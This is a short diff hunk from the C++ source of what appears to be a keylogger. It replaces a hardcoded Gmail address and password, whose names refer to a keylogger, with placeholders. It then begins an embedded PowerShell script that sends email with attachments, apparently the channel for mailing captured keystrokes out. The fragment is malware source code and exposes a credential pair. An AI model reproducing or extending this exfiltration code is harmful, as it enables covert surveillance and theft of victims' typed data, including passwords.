@@ -11,9 +11,9 @@
 
 namespace Mail
 {
-    #define X_EM_TO "logger.key.usage.2020@gmail.com"
-    #define X_EM_FROM "logger.key.usage.2020@gmail.com"
-    #define X_EM_PASS "keylogger20"
+    #define X_EM_TO "YOUR RECEIVING EMAIL"
+    #define X_EM_FROM "YOUR SENDING EMAIL"
+    #define X_EM_PASS "YOUR PASSWORD"
 
     const std::string &PowerShellScript = "Param( #parameters to our script\r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
 "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
